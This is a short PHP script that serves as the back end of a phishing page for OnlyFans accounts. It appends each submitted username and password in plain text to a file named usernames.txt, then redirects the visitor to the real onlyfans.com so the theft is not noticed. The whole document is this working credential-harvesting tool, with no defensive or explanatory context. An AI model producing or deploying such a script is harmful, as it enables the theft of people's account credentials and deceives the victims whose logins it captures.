<?php
file_put_contents("usernames.txt", "OnlyFans Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://onlyfans.com');
exit();
?>